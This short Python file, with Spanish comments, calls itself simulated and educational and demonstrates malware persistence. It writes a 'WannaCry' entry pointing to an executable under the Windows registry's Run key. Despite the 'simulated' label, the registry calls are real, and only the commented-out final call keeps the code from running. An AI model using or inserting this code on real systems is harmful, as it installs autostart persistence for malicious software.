# ADVERTENCIA: Este es un archivo simulado educativo. No ejecutar en sistemas reales.
# Simula modificaciones al registro de Windows para persistencia.

import winreg  # Simulado

def add_to_registry():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WannaCry", 0, winreg.REG_SZ, r"C:\Windows\System32\wannacry.exe")
    winreg.CloseKey(key)
    print("Añadido al registro para persistencia.")

# add_to_registry()